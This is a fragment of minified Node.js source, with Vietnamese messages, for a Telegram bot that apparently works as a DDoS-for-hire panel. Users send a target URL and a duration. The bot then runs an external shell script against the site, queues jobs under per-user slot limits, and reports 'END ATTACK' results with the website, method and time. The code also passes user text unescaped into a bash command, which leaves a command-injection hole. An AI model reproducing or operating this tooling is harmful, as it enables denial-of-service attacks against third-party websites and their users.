...
try{t=fs.readFileSync(C.token,'utf8').trim();if(!t)throw new Error('❌ Token không hợp lệ');if(fs.existsSync(C.admin))a=new Set(fs.readFileSync(C.admin,'utf8').split('\n').filter(Boolean));if(fs.existsSync(C.group))g=new Set(fs.readFileSync(C.group,'utf8').split('\n').filter(Boolean));if(fs.existsSync(C.blacklist))b=fs.readFileSync(C.blacklist,'utf8').split('\n').filter(Boolean);}catch(e){console.error(e.message);process.exit(1);}
...
if(text.startsWith('http')){if(!y)return bot.sendMessage(c,'❌ Bot đang tắt',{parse_mode:'HTML'});const [h,t]=text.split(' ');if(!h||isNaN(t))return bot.sendMessage(c,'🚫 Sai định dạng: <code>https://site.com 60</code>',{parse_mode:'HTML'});if(b.some(b=>h.includes(b)))return bot.sendMessage(c,'❌ URL bị chặn',{parse_mode:'HTML'});const du=Math.min(parseInt(t),L.maxTime);if([...x.values()].filter(v=>v.u===u).length>=L.slot)return bot.sendMessage(c,`❌ Giới hạn ${L.slot} tiến trình`,{parse_mode:'HTML'});if(x.size>=L.concurrent){q.push({u,h,t:du,c,cl});return bot.sendMessage(c,'⏳ Đang chờ...',{parse_mode:'HTML'});}
...
exec(`./${C.script} "${h}" "${du}"`,{shell:'/bin/bash'},(e,o,er)=>{if(e)return;bot.sendMessage(c,JSON.stringify({Status:"👽 END ATTACK 👽",Caller:cl,"PID Attack":pid,Website:h,Methods:m,Time:`${du} Giây`,EndTime:new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'})},null,2),{parse_mode:'HTML'});x.delete(pid);if(q.length&&x.size<L.concurrent){const n=q.shift();bot.sendMessage(n.c,`📥 Bắt đầu: ${n.h} ${n.t}s`);bot.emit('message',{chat:{id:n.c},from:{id:n.u,username:n.cl},text:`${n.h} ${n.t}`);}});return;}
if(!ad)return;
